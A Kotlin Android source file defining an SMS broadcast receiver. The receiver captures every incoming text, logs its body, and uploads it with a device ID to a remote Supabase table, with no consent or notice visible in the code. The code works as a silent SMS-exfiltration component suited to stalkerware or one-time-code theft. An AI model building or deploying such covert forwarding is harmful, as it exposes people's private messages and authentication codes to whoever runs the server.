package com.nemesis.restricted

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Context.MODE_PRIVATE
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import io.github.jan.supabase.postgrest.*
import kotlinx.coroutines.*
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("SmsReceiver", "BroadcastReceiver triggered.")
        val bundle = intent.extras
        if (bundle != null) {
            // Safely retrieve the pdus array from the intent bundle
            val pdus = bundle.get("pdus") as? Array<*>
            val format = bundle.getString("format") // Retrieve the format directly

            if (pdus != null && format != null) {
                for (pdu in pdus) {
                    val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                    val messageBody = smsMessage.messageBody
                    Log.d("SmsReceiver", "SMS Received: message = $messageBody")

                    val sharedPreferences = context.getSharedPreferences("pref1", MODE_PRIVATE)
                    val deviceId = sharedPreferences.getLong("device_id", -1);
                    if(deviceId != -1L) {
                        sendSmsToSupabase(messageBody, deviceId)
                    }
                }
            }
        }
    }

    @Serializable
    data class SmsData(
        val id_device: Long,
        val message: String
    )

    private fun sendSmsToSupabase(messageBody: String, deviceId: Long) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val smsData = SmsData(
                    id_device = deviceId,
                    message = messageBody
                )
                SupabaseClientManager.supabase.from("sms_received").insert(smsData)
                Log.d("SupabaseSuccess", "Data sent to Supabase successfully.")
            } catch (e: Exception) {
                Log.e("SupabaseError", "Failure: ${e.message}")
            }
        }
    }
}